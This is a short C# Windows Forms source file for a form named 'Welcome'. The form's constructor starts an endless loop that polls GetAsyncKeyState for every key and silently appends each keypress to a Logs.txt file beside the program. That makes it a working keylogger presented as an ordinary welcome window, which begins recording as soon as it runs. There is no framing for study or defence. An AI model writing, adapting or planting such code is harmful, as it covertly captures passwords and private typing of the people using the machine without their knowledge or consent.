using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Program
{
    public partial class Welcome : Form
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        public Welcome()
        {
            InitializeComponent();
            Start();
        }
        private static void Start()
        {
            while (true)
            {
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        //Console.WriteLine((Keys)i);
                        string toStringKeys = Convert.ToString((Keys)i);
                        try
                        {
                            File.AppendAllText(Application.StartupPath + "\\Logs.txt", Environment.NewLine + toStringKeys);
                        }
                        catch
                        {
                        }
                        break;
                    }
                }
            }
        }
    }
}
